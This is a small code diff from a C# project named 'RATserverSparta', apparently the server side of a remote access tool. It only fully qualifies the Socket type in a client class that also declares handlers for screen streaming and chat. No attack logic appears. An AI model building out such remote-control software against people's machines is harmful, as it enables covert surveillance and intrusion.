@@ -12,7 +12,7 @@ namespace RATserverSparta.Client
     public class Client
     {
         public delegate void LogAddValue(string type, string value, string date);
-        public delegate void ListViewItemAdd(string type, Socket sck, byte[] message, int index);
+        public delegate void ListViewItemAdd(string type, System.Net.Sockets.Socket sck, byte[] message, int index);
         public delegate void GotChatMessage(byte[] buffer);
         public delegate void screenStream(byte[] buffer);
 
@@ -23,10 +23,10 @@ namespace RATserverSparta.Client
 
         public string ScreenResolution;
         private MainGUI MainGUI_Instance;
-        private Socket ClientSocket;
+        private System.Net.Sockets.Socket ClientSocket;
         private bool ClientConnected;
 
-        public Client(MainGUI MainGUI_Instance, Socket Server) 
+        public Client(MainGUI MainGUI_Instance, System.Net.Sockets.Socket Server) 
         {
             this.MainGUI_Instance = MainGUI_Instance;
             this.ClientSocket = Server;
